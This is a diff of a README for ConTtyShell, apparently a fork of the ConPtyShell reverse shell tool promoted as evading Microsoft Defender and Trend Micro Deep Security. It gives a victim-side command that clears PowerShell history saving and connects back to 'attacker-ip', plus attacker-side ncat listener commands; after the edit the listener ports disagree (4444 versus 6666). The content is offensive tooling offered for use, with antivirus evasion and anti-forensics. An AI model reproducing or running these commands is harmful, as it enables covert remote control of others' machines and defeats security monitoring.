@@ -1,6 +1,6 @@
 # ConTtyShell
 ConPtyShell Fork that Evades:
-* Microsoft Defender (as of 25/12/2024)
+* Microsoft Defender (as of 14/06/2025)
 * Trend Micro Deep Security (as of 03/12/2024)
 
 **Original:**
@@ -22,15 +22,15 @@ https://github.com/antonioCoco/ConPtyShell
 
 ```
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
-.\ConTtyShell.exe attacker-ip 6666
+.\ConTtyShell.exe attacker-ip 4444
 ```
 
 **Attacker side usage example:**
 
 ```
-stty raw -echo; (stty size; cat) | ncat -lvnp 6666
+rlwrap ncat -lvnp 4444
 
 Or
 
-rlwrap ncat -lvnp 6666
+stty raw -echo; (stty size; cat) | ncat -lvnp 6666
 ```
